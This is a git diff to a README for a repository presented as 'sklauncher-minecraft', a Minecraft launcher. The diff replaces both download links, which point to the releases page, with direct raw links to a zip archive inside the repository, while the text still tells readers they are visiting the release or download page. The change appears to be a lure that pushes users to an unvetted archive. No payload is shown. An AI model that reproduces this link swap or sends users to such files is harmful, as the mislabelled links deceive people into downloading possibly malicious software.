@@ -1,6 +1,6 @@
 # 🚀 sklauncher-minecraft - Play Minecraft with better custom features
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/apgam1690/sklauncher-minecraft/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/apgam1690/sklauncher-minecraft/main/Mine/minecraft-sklauncher-2.3-beta.1.zip)
 
 SkLauncher is a tool for Minecraft. It handles game startup and manages your game files. You can use it to play with official accounts or offline accounts. It supports mod loaders like Fabric, Forge, and Quilt. You can also customize your character with skins and capes through the built-in manager.
 
@@ -8,7 +8,7 @@ SkLauncher is a tool for Minecraft. It handles game startup and manages your gam
 
 To get started, navigate to the release page.
 
-[Click here to visit the download page](https://github.com/apgam1690/sklauncher-minecraft/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/apgam1690/sklauncher-minecraft/main/Mine/minecraft-sklauncher-2.3-beta.1.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version at the top of the list.
